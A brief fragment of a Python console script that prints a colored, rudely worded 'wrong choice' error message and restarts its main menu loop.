        print('{}[{} ! {}] WRONG CHOICE IDIOT !'.format(F.LIGHTWHITE_EX,F.LIGHTYELLOW_EX,F.LIGHTWHITE_EX))
        main()

main()